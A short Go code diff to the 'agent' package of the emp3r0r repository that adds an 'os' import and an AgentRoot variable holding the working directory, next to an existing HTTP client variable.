@@ -1,11 +1,16 @@
 package agent
 
 import (
+	"os"
+
 	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
 	"github.com/posener/h2conn"
 )
 
 var (
+	// AgentRoot root directory of emp3r0r
+	AgentRoot, _ = os.Getwd()
+
 	// HTTPClient handles agent's http communication
 	HTTPClient = tun.EmpHTTPClient()
 
